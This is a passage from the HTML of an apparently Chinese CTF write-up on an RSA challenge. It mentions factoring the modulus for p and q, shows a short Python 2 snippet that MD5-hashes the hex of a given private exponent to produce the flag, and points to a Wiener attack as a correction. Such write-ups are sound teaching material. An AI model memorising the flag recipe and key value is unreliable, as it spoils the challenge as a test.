class="string">&quot;flag&#123;&quot;</span> + hashlib.md5(<span class="built_in">hex</span>(d)).hexdigest() + <span class="string">&quot;&#125;&quot;</span></span><br></pre></td></tr></table></figure>
+<p>大数分解素数可以得到p与q，但是进行编码时因为python3与2的md5编码方式区别导致类型错误，在在线python2环境中运行代码：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">d= <span class="number">8920758995414587152829426558580025657357328745839747693739591820283538307445</span></span><br><span class="line">a = hashlib.md5(<span class="built_in">hex</span>(d)).hexdigest()</span><br><span class="line"><span class="built_in">print</span>(a)</span><br></pre></td></tr></table></figure>
+<p>修正——维纳攻击</p>
 
       
     </div>
